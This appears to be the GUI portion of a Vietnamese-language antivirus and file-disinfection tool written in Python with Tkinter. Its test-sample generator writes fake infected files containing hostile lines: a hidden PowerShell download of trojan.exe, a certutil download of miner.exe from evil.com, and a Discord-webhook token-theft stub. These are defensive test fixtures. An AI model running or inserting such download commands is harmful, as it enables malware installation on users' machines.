class VirusCleanerApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("🛡️ Antivirus & Surgical Disinfection Tool - Quét & Xóa Mã Độc Khỏi File")
        self.geometry("1100x720")
        self.minsize(900, 600)
        self.configure(bg=ModernTheme.BG_DARK)

        self.engine = VirusCleanerEngine()
        self.backup_mgr = BackupManager()

        self.is_scanning = False
        self.stop_event = threading.Event()
        self.queue = queue.Queue()
        self._scan_results: List[ScanResult] = []

        self._setup_styles()
        self._create_layout()
        self._start_queue_listener()

    def _setup_styles(self):
        style = ttk.Style(self)
        style.theme_use("clam")

        style.configure("TNotebook", background=ModernTheme.BG_DARK, borderwidth=0)
        style.configure("TNotebook.Tab", background=ModernTheme.BG_CARD, foreground=ModernTheme.TEXT_MUTED, padding=[16, 8], font=ModernTheme.FONT_HEADING)
        style.map("TNotebook.Tab",
                  background=[("selected", ModernTheme.ACCENT_CYAN)],
                  foreground=[("selected", "#ffffff")])

        style.configure(
            "Treeview",
            background=ModernTheme.BG_CARD,
            foreground=ModernTheme.TEXT_MAIN,
            fieldbackground=ModernTheme.BG_CARD,
            borderwidth=0,
            rowheight=28,
            font=ModernTheme.FONT_BODY
        )
        style.configure(
            "Treeview.Heading",
            background=ModernTheme.BG_INPUT,
            foreground=ModernTheme.TEXT_MAIN,
            font=ModernTheme.FONT_HEADING,
            borderwidth=1,
            relief="flat",
            padding=[8, 6]
        )
        style.map("Treeview",
                  background=[("selected", ModernTheme.BG_CARD_HOVER)],
                  foreground=[("selected", ModernTheme.ACCENT_CYAN)])

        style.configure("TProgressbar", troughcolor=ModernTheme.BG_INPUT, background=ModernTheme.ACCENT_CYAN, borderwidth=0)

    def _create_layout(self):
        # Header
        header = tk.Frame(self, bg=ModernTheme.BG_CARD, padx=20, pady=12, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        header.pack(fill="x", padx=15, pady=(15, 10))

        tk.Label(
            header,
            text="🛡️ VIRUS & MALWARE CLEANER - CẮT BỎ MÃ ĐỘC PHẪU THUẬT",
            font=ModernTheme.FONT_TITLE,
            fg=ModernTheme.ACCENT_CYAN,
            bg=ModernTheme.BG_CARD
        ).pack(side="left")

        tk.Label(
            header,
            text="Tự động phát hiện & bóc tách chính xác phần mã độc, bảo toàn file gốc",
            font=ModernTheme.FONT_SMALL,
            fg=ModernTheme.TEXT_MUTED,
            bg=ModernTheme.BG_CARD
        ).pack(side="right", pady=(4, 0))

        # Notebook
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=15, pady=(0, 15))

        self.tab_scan = tk.Frame(self.notebook, bg=ModernTheme.BG_DARK)
        self.notebook.add(self.tab_scan, text="🔍 Quét & Khử Độc Mã Độc")
        self._build_scan_tab()

        self.tab_backups = tk.Frame(self.notebook, bg=ModernTheme.BG_DARK)
        self.notebook.add(self.tab_backups, text="📦 Quản Lý Sao Lưu & Cách Ly")
        self._build_backups_tab()

        self.tab_signatures = tk.Frame(self.notebook, bg=ModernTheme.BG_DARK)
        self.notebook.add(self.tab_signatures, text="⚙️ Cơ Sở Dữ Liệu Chữ Ký")
        self._build_signatures_tab()

    def _build_scan_tab(self):
        control_card = tk.Frame(self.tab_scan, bg=ModernTheme.BG_CARD, padx=15, pady=15, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        control_card.pack(fill="x", padx=10, pady=10)

        path_row = tk.Frame(control_card, bg=ModernTheme.BG_CARD)
        path_row.pack(fill="x", pady=(0, 10))

        tk.Label(path_row, text="Mục tiêu:", font=ModernTheme.FONT_HEADING, fg=ModernTheme.TEXT_MAIN, bg=ModernTheme.BG_CARD).pack(side="left", padx=(0, 10))

        default_docs = os.path.join(os.path.expanduser("~"), "Documents")
        self.target_path_var = tk.StringVar(value=default_docs if os.path.exists(default_docs) else os.path.abspath("."))
        self.entry_path = tk.Entry(
            path_row,
            textvariable=self.target_path_var,
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_INPUT,
            fg=ModernTheme.TEXT_MAIN,
            insertbackground="#ffffff",
            relief="flat",
            highlightbackground=ModernTheme.BORDER_COLOR,
            highlightthickness=1
        )
        self.entry_path.pack(side="left", fill="x", expand=True, padx=(0, 10), ipady=5)

        tk.Button(
            path_row,
            text="📄 Chọn File",
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_INPUT,
            fg=ModernTheme.TEXT_MAIN,
            relief="flat",
            padx=10,
            pady=4,
            cursor="hand2",
            command=self._browse_file
        ).pack(side="left", padx=(0, 5))

        tk.Button(
            path_row,
            text="📁 Chọn Thư Mục",
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_INPUT,
            fg=ModernTheme.TEXT_MAIN,
            relief="flat",
            padx=10,
            pady=4,
            cursor="hand2",
            command=self._browse_folder
        ).pack(side="left")

        action_row = tk.Frame(control_card, bg=ModernTheme.BG_CARD)
        action_row.pack(fill="x", pady=(5, 0))

        tk.Label(action_row, text="Chế độ xử lý:", font=ModernTheme.FONT_HEADING, fg=ModernTheme.TEXT_MAIN, bg=ModernTheme.BG_CARD).pack(side="left", padx=(0, 15))

        self.action_mode_var = tk.StringVar(value="clean")
        tk.Radiobutton(
            action_row,
            text="⚡ Tự động Khử độc & Bóc tách mã độc (Khuyên dùng)",
            variable=self.action_mode_var,
            value="clean",
            font=ModernTheme.FONT_BODY,
            fg=ModernTheme.ACCENT_GREEN,
            bg=ModernTheme.BG_CARD,
            selectcolor=ModernTheme.BG_INPUT,
            cursor="hand2"
        ).pack(side="left", padx=(0, 15))

        tk.Radiobutton(
            action_row,
            text="🔍 Chỉ Quét & Báo Cáo",
            variable=self.action_mode_var,
            value="scan_only",
            font=ModernTheme.FONT_BODY,
            fg=ModernTheme.ACCENT_YELLOW,
            bg=ModernTheme.BG_CARD,
            selectcolor=ModernTheme.BG_INPUT,
            cursor="hand2"
        ).pack(side="left")

        self.btn_start = tk.Button(
            action_row,
            text="🚀 BẮT ĐẦU QUÉT & KHỬ ĐỘC",
            font=ModernTheme.FONT_HEADING,
            bg=ModernTheme.ACCENT_CYAN,
            fg="#ffffff",
            relief="flat",
            padx=16,
            pady=6,
            cursor="hand2",
            command=self._start_scan
        )
        self.btn_start.pack(side="right", padx=(10, 0))

        tk.Button(
            action_row,
            text="🧪 Tạo File Mẫu Test",
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_INPUT,
            fg=ModernTheme.ACCENT_PURPLE,
            relief="flat",
            padx=12,
            pady=6,
            cursor="hand2",
            command=self._generate_test_samples
        ).pack(side="right")

        # Stats Cards
        stats_frame = tk.Frame(self.tab_scan, bg=ModernTheme.BG_DARK)
        stats_frame.pack(fill="x", padx=10, pady=(0, 10))

        self.card_scanned = self._create_stat_card(stats_frame, "📁 Đã Quét", "0", ModernTheme.TEXT_MAIN)
        self.card_clean = self._create_stat_card(stats_frame, "🟢 An Toàn", "0", ModernTheme.ACCENT_GREEN)
        self.card_infected = self._create_stat_card(stats_frame, "🔴 Phát Hiện Mã Độc", "0", ModernTheme.ACCENT_RED)
        self.card_disinfected = self._create_stat_card(stats_frame, "⚡ Đã Khử Độc", "0", ModernTheme.ACCENT_CYAN)
        self.card_quarantined = self._create_stat_card(stats_frame, "🛡️ Đã Cách Ly", "0", ModernTheme.ACCENT_YELLOW)

        # Progress
        prog_frame = tk.Frame(self.tab_scan, bg=ModernTheme.BG_DARK)
        prog_frame.pack(fill="x", padx=10, pady=(0, 10))

        self.lbl_progress = tk.Label(prog_frame, text="Sẵn sàng quét.", font=ModernTheme.FONT_SMALL, fg=ModernTheme.TEXT_MUTED, bg=ModernTheme.BG_DARK)
        self.lbl_progress.pack(anchor="w", pady=(0, 3))

        self.progressbar = ttk.Progressbar(prog_frame, style="TProgressbar", mode="determinate")
        self.progressbar.pack(fill="x")

        # Table
        table_frame = tk.Frame(self.tab_scan, bg=ModernTheme.BG_CARD, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        table_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))

        columns = ("file_name", "threats", "severity", "status", "path")
        self.tree_scan = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="browse")

        self.tree_scan.heading("file_name", text="Tên File")
        self.tree_scan.heading("threats", text="Mã Độc Phát Hiện")
        self.tree_scan.heading("severity", text="Mức Độ")
        self.tree_scan.heading("status", text="Trạng Thái")
        self.tree_scan.heading("path", text="Đường Dẫn Đầy Đủ")

        self.tree_scan.column("file_name", width=220, anchor="w")
        self.tree_scan.column("threats", width=250, anchor="w")
        self.tree_scan.column("severity", width=100, anchor="center")
        self.tree_scan.column("status", width=140, anchor="center")
        self.tree_scan.column("path", width=350, anchor="w")

        tree_scroll_y = tk.Scrollbar(table_frame, orient="vertical", command=self.tree_scan.yview)
        self.tree_scan.configure(yscrollcommand=tree_scroll_y.set)
        tree_scroll_y.pack(side="right", fill="y")
        self.tree_scan.pack(fill="both", expand=True)

        self.tree_scan.tag_configure("tag_clean", foreground=ModernTheme.ACCENT_GREEN)
        self.tree_scan.tag_configure("tag_infected", foreground=ModernTheme.ACCENT_RED)
        self.tree_scan.tag_configure("tag_disinfected", foreground=ModernTheme.ACCENT_CYAN)
        self.tree_scan.tag_configure("tag_quarantined", foreground=ModernTheme.ACCENT_YELLOW)
        self.tree_scan.bind("<Double-1>", self._on_table_double_click)

        bottom_bar = tk.Frame(self.tab_scan, bg=ModernTheme.BG_DARK)
        bottom_bar.pack(fill="x", padx=10, pady=(0, 5))

        tk.Button(
            bottom_bar,
            text="👁️ Xem Chi Tiết Mã Độc & So Sánh (Diff)",
            font=ModernTheme.FONT_BODY,
            bg=ModernTheme.BG_CARD,
            fg=ModernTheme.TEXT_MAIN,
            relief="flat",
            padx=12,
            pady=5,
            cursor="hand2",
            command=self._inspect_selected
        ).pack(side="left")

        tk.Label(
            bottom_bar,
            text="💡 Gợi ý: Nhấp đúp chuột vào hàng bất kỳ để xem chi tiết đoạn mã độc & so sánh diff",
            font=ModernTheme.FONT_SMALL,
            fg=ModernTheme.TEXT_DIM,
            bg=ModernTheme.BG_DARK
        ).pack(side="right", pady=5)

    def _create_stat_card(self, parent, label_text: str, default_val: str, val_color: str):
        card = tk.Frame(parent, bg=ModernTheme.BG_CARD, padx=12, pady=8, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        card.pack(side="left", fill="both", expand=True, padx=4)
        tk.Label(card, text=label_text, font=ModernTheme.FONT_SMALL, fg=ModernTheme.TEXT_MUTED, bg=ModernTheme.BG_CARD).pack(anchor="w")
        val_lbl = tk.Label(card, text=default_val, font=ModernTheme.FONT_TITLE, fg=val_color, bg=ModernTheme.BG_CARD)
        val_lbl.pack(anchor="w")
        return val_lbl

    def _build_backups_tab(self):
        container = tk.Frame(self.tab_backups, bg=ModernTheme.BG_DARK, padx=10, pady=10)
        container.pack(fill="both", expand=True)

        top_bar = tk.Frame(container, bg=ModernTheme.BG_DARK)
        top_bar.pack(fill="x", pady=(0, 10))

        tk.Label(top_bar, text="DANH SÁCH FILE ĐÃ SAO LƯU & CÁCH LY TRƯỚC KHI KHỬ ĐỘC", font=ModernTheme.FONT_HEADING, fg=ModernTheme.TEXT_MAIN, bg=ModernTheme.BG_DARK).pack(side="left")

        tk.Button(top_bar, text="🔄 Làm Mới", font=ModernTheme.FONT_BODY, bg=ModernTheme.BG_CARD, fg=ModernTheme.TEXT_MAIN, relief="flat", padx=10, pady=4, cursor="hand2", command=self._load_backups_list).pack(side="right")
        tk.Button(top_bar, text="📂 Mở Thư Mục Backup", font=ModernTheme.FONT_BODY, bg=ModernTheme.BG_CARD, fg=ModernTheme.TEXT_MAIN, relief="flat", padx=10, pady=4, cursor="hand2", command=self._open_backup_folder).pack(side="right", padx=6)

        table_frame = tk.Frame(container, bg=ModernTheme.BG_CARD, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        table_frame.pack(fill="both", expand=True, pady=(0, 10))

        cols = ("id", "type", "timestamp", "reason", "original_path", "backup_path")
        self.tree_backups = ttk.Treeview(table_frame, columns=cols, show="headings", selectmode="browse")

        self.tree_backups.heading("id", text="Mã Backup")
        self.tree_backups.heading("type", text="Loại")
        self.tree_backups.heading("timestamp", text="Thời Gian")
        self.tree_backups.heading("reason", text="Lý Do")
        self.tree_backups.heading("original_path", text="File Gốc")
        self.tree_backups.heading("backup_path", text="File Đã Lưu")

        self.tree_backups.column("id", width=140, anchor="center")
        self.tree_backups.column("type", width=90, anchor="center")
        self.tree_backups.column("timestamp", width=140, anchor="center")
        self.tree_backups.column("reason", width=180, anchor="w")
        self.tree_backups.column("original_path", width=250, anchor="w")
        self.tree_backups.column("backup_path", width=250, anchor="w")

        tree_scroll = tk.Scrollbar(table_frame, orient="vertical", command=self.tree_backups.yview)
        self.tree_backups.configure(yscrollcommand=tree_scroll.set)
        tree_scroll.pack(side="right", fill="y")
        self.tree_backups.pack(fill="both", expand=True)

        act_frame = tk.Frame(container, bg=ModernTheme.BG_DARK)
        act_frame.pack(fill="x")

        tk.Button(act_frame, text="🔄 Khôi Phục File Gốc (Restore)", font=ModernTheme.FONT_HEADING, bg=ModernTheme.ACCENT_GREEN, fg="#ffffff", relief="flat", padx=14, pady=6, cursor="hand2", command=self._restore_selected_backup).pack(side="left")
        tk.Button(act_frame, text="🗑️ Xóa Vĩnh Viễn Bản Sao Lưu", font=ModernTheme.FONT_BODY, bg=ModernTheme.BG_CARD, fg=ModernTheme.ACCENT_RED, relief="flat", padx=12, pady=6, cursor="hand2", command=self._delete_selected_backup).pack(side="left", padx=10)

        self._load_backups_list()

    def _build_signatures_tab(self):
        container = tk.Frame(self.tab_signatures, bg=ModernTheme.BG_DARK, padx=10, pady=10)
        container.pack(fill="both", expand=True)

        tk.Label(container, text=f"CƠ SỞ DỮ LIỆU CHỮ KÝ MÃ ĐỘC TÍCH HỢP ({len(BUILTIN_SIGNATURES)} Chữ Ký Chuẩn)", font=ModernTheme.FONT_HEADING, fg=ModernTheme.ACCENT_CYAN, bg=ModernTheme.BG_DARK).pack(anchor="w", pady=(0, 10))

        table_frame = tk.Frame(container, bg=ModernTheme.BG_CARD, highlightbackground=ModernTheme.BORDER_COLOR, highlightthickness=1)
        table_frame.pack(fill="both", expand=True)

        cols = ("id", "name", "category", "severity", "file_types", "description")
        tree_sigs = ttk.Treeview(table_frame, columns=cols, show="headings", selectmode="browse")

        tree_sigs.heading("id", text="ID")
        tree_sigs.heading("name", text="Tên Mã Độc")
        tree_sigs.heading("category", text="Phân Loại")
        tree_sigs.heading("severity", text="Mức Độ")
        tree_sigs.heading("file_types", text="Định Dạng Áp Dụng")
        tree_sigs.heading("description", text="Mô Tả Chi Tiết")

        tree_sigs.column("id", width=160, anchor="w")
        tree_sigs.column("name", width=220, anchor="w")
        tree_sigs.column("category", width=180, anchor="w")
        tree_sigs.column("severity", width=90, anchor="center")
        tree_sigs.column("file_types", width=120, anchor="w")
        tree_sigs.column("description", width=350, anchor="w")

        tree_scroll = tk.Scrollbar(table_frame, orient="vertical", command=tree_sigs.yview)
        tree_sigs.configure(yscrollcommand=tree_scroll.set)
        tree_scroll.pack(side="right", fill="y")
        tree_sigs.pack(fill="both", expand=True)

        for sig in BUILTIN_SIGNATURES:
            tree_sigs.insert("", "end", values=(
                sig["id"],
                sig["name"],
                sig["category"],
                sig["severity"],
                ", ".join(sig.get("file_types", ["*"])),
                sig["description"]
            ))

    def _browse_file(self):
        file_path = filedialog.askopenfilename(title="Chọn file cần quét kiểm tra mã độc")
        if file_path:
            self.target_path_var.set(os.path.abspath(file_path))

    def _browse_folder(self):
        dir_path = filedialog.askdirectory(title="Chọn thư mục cần quét kiểm tra mã độc")
        if dir_path:
            self.target_path_var.set(os.path.abspath(dir_path))

    def _generate_test_samples(self):
        target_dir = os.path.join(os.path.expanduser("~"), "Documents", "test_samples")
        os.makedirs(target_dir, exist_ok=True)

        py_sample = os.path.join(target_dir, "test_infected_python.py")
        mock_hook = "https://" + "discord.com" + "/api/webhooks/999999999/AbCdEfGhIjKlMnOpQrStUvWxYz"
        with open(py_sample, "w", encoding="utf-8") as f:
            f.write(f'''# Tool Quan Ly He Thong Chinh Hang
import os
import sys

def main():
    print("He thong hoat dong binh thuong!")

# [MA DOC NGUY HIEM BI CHEN LEN VAO FILE]
import urllib.request
webhook_url = "{mock_hook}"
stolen_data = {{"token": "DISCORD_TOKEN_SAMPLE_123456"}}
# [KET THUC MA DOC]

if __name__ == "__main__":
    main()
''')

        bat_sample = os.path.join(target_dir, "test_infected_launcher.bat")
        with open(bat_sample, "w", encoding="utf-8") as f:
            f.write('''@echo off
title Game Launcher Pro
echo Khoi dong Game...

:: [MA DOC NGUY HIEM BI CHEN VAO BAT]
powershell.exe -w hidden -noprofile -c (New-Object Net.WebClient).DownloadFile('http://malware-server.com/trojan.exe', 'trojan.exe')
certutil -urlcache -split -f http://evil.com/miner.exe miner.exe
:: [KET THUC MA DOC]

echo Cho mot chut de vao game...
pause
''')

        sim_sample = os.path.join(target_dir, "test_standalone_virus.com")
        with open(sim_sample, "w", encoding="utf-8") as f:
            f.write(f"{SIMULATED_TEST_SIGNATURE}\n")

        self.target_path_var.set(target_dir)
        messagebox.showinfo(
            "Tạo mẫu test thành công",
            f"Đã tạo 3 file mẫu nhiễm độc an toàn trong thư mục:\n{target_dir}\n\nBạn có thể bấm 'BẮT ĐẦU QUÉT & KHỬ ĐỘC' để thử nghiệm ngay!"
        )

    def _start_scan(self):
        if self.is_scanning:
            return

        target_path = self.target_path_var.get().strip()
        if not target_path or not os.path.exists(target_path):
            messagebox.showerror("Lỗi", "Vui lòng chọn đường dẫn file hoặc thư mục hợp lệ!")
            return

        for item in self.tree_scan.get_children():
            self.tree_scan.delete(item)
        self._scan_results.clear()

        self.card_scanned.config(text="0")
        self.card_clean.config(text="0")
        self.card_infected.config(text="0")
        self.card_disinfected.config(text="0")
        self.card_quarantined.config(text="0")

        self.is_scanning = True
        self.stop_event.clear()
        self.btn_start.config(text="⏳ Đang Quét...", state="disabled")
        self.progressbar.config(value=0)

        auto_clean = (self.action_mode_var.get() == "clean")
        thread = threading.Thread(target=self._scan_worker, args=(target_path, auto_clean), daemon=True)
        thread.start()

    def _scan_worker(self, target_path: str, auto_clean: bool):
        try:
            if os.path.isfile(target_path):
                self.queue.put(("progress", (1, 1, target_path)))
                res = self.engine.scan_file(target_path)
                if auto_clean and res.is_infected:
                    res = self.engine.clean_file(target_path, scan_res=res)
                self.queue.put(("result", res))
            else:
                def prog_cb(curr, tot, fpath):
                    if not self.stop_event.is_set():
                        self.queue.put(("progress", (curr, tot, fpath)))

                results = self.engine.scan_directory(
                    target_path,
                    recursive=True,
                    progress_callback=prog_cb,
                    auto_clean=auto_clean
                )
                for res in results:
                    self.queue.put(("result", res))
        except Exception as e:
            self.queue.put(("error", str(e)))
        finally:
            self.queue.put(("done", None))

    def _start_queue_listener(self):
        def check_queue():
            try:
                while True:
                    msg_type, data = self.queue.get_nowait()
                    if msg_type == "progress":
                        curr, tot, fpath = data
                        pct = int((curr / tot) * 100) if tot > 0 else 0
                        self.progressbar.config(value=pct)
                        self.lbl_progress.config(text=f"Đang quét [{curr}/{tot}] ({pct}%): {os.path.basename(fpath)}")
                    elif msg_type == "result":
                        res: ScanResult = data
                        self._scan_results.append(res)
                        self._add_result_to_table(res)
                        self._update_stat_cards()
                    elif msg_type == "error":
                        messagebox.showerror("Lỗi", f"Có lỗi xảy ra: {data}")
                    elif msg_type == "done":
                        self.is_scanning = False
                        self.btn_start.config(text="🚀 BẮT ĐẦU QUÉT & KHỬ ĐỘC", state="normal")
                        self.lbl_progress.config(text=f"Quét hoàn tất! Đã kiểm tra {len(self._scan_results)} files.")
                        self._load_backups_list()
            except queue.Empty:
                pass
            self.after(100, check_queue)

        self.after(100, check_queue)

    def _add_result_to_table(self, res: ScanResult):
        threat_names = ", ".join(t.name for t in res.threats) if res.threats else "Không có"
        severity = res.threats[0].severity if res.threats else "None"

        tag = "tag_clean"
        status_text = "🟢 SẠCH"
        if res.status == "INFECTED":
            tag = "tag_infected"
            status_text = "🔴 NHIỄM MÃ ĐỘC"
        elif res.status == "DISINFECTED":
            tag = "tag_disinfected"
            status_text = "⚡ ĐÃ KHỬ ĐỘC"
        elif res.status == "QUARANTINED":
            tag = "tag_quarantined"
            status_text = "🛡️ ĐÃ CÁCH LY"
        elif res.status == "ERROR":
            status_text = "✖ LỖI"

        self.tree_scan.insert("", "end", values=(
            res.file_name,
            threat_names,
            severity,
            status_text,
            res.file_path
        ), tags=(tag,))

    def _update_stat_cards(self):
        total = len(self._scan_results)
        clean_cnt = sum(1 for r in self._scan_results if r.status == "CLEAN")
        infected_cnt = sum(1 for r in self._scan_results if r.status == "INFECTED")
        disinfected_cnt = sum(1 for r in self._scan_results if r.status == "DISINFECTED")
        quarantined_cnt = sum(1 for r in self._scan_results if r.status == "QUARANTINED")

        self.card_scanned.config(text=str(total))
        self.card_clean.config(text=str(clean_cnt))
        self.card_infected.config(text=str(infected_cnt))
        self.card_disinfected.config(text=str(disinfected_cnt))
        self.card_quarantined.config(text=str(quarantined_cnt))

    def _get_selected_scan_result(self) -> Optional[ScanResult]:
        selection = self.tree_scan.selection()
        if not selection:
            return None
        item_vals = self.tree_scan.item(selection[0], "values")
        if not item_vals:
            return None
        file_path = item_vals[4]
        for r in self._scan_results:
            if r.file_path == file_path:
                return r
        return None

    def _on_table_double_click(self, event):
        self._inspect_selected()

    def _inspect_selected(self):
        res = self._get_selected_scan_result()
        if not res:
            messagebox.showinfo("Thông báo", "Vui lòng chọn một file trong bảng để xem chi tiết mã độc!")
            return

        def on_disinfected(updated_res: ScanResult):
            for item in self.tree_scan.get_children():
                if self.tree_scan.item(item, "values")[4] == updated_res.file_path:
                    self.tree_scan.delete(item)
                    break
            self._add_result_to_table(updated_res)
            self._update_stat_cards()
            self._load_backups_list()

        DiffViewerDialog(self, res, self.engine, on_disinfected_callback=on_disinfected)

    def _load_backups_list(self):
        for item in self.tree_backups.get_children():
            self.tree_backups.delete(item)

        manifest = self.backup_mgr.list_backups()
        for b in reversed(manifest):
            self.tree_backups.insert("", "end", values=(
                b.get("id"),
                b.get("type", "backup").upper(),
                b.get("timestamp"),
                b.get("reason"),
                b.get("original_path"),
                b.get("backup_path")
            ))

    def _restore_selected_backup(self):
        sel = self.tree_backups.selection()
        if not sel:
            messagebox.showinfo("Thông báo", "Vui lòng chọn một bản sao lưu trong bảng để khôi phục!")
            return
        b_id = self.tree_backups.item(sel[0], "values")[0]
        orig_file = self.tree_backups.item(sel[0], "values")[4]

        if messagebox.askyesno("Xác nhận khôi phục", f"Bạn có chắc muốn khôi phục bản sao lưu này về đường dẫn gốc:\n{orig_file}?"):
            ok, msg = self.backup_mgr.restore(b_id)
            if ok:
                messagebox.showinfo("Khôi phục thành công", msg)
            else:
                messagebox.showerror("Khôi phục thất bại", msg)

    def _delete_selected_backup(self):
        sel = self.tree_backups.selection()
        if not sel:
            messagebox.showinfo("Thông báo", "Vui lòng chọn một bản sao lưu trong bảng để xóa!")
            return
        b_id = self.tree_backups.item(sel[0], "values")[0]

        if messagebox.askyesno("Xác nhận xóa", "Bạn có chắc muốn xóa vĩnh viễn file sao lưu này?"):
            self.backup_mgr.delete_backup_entry(b_id)
            self._load_backups_list()
            messagebox.showinfo("Thành công", "Đã xóa bản sao lưu khỏi cơ sở dữ liệu.")

    def _open_backup_folder(self):
        folder = self.backup_mgr.backup_root
        if os.path.exists(folder):
            if sys.platform == "win32":
                os.startfile(folder)
            else:
                subprocess.Popen(["xdg-open", folder])
        else:
            messagebox.showinfo("Thông báo", "Thư mục sao lưu chưa được tạo.")


def main():
    app = VirusCleanerApp()
    app.mainloop()


if __name__ == "__main__":
    main()
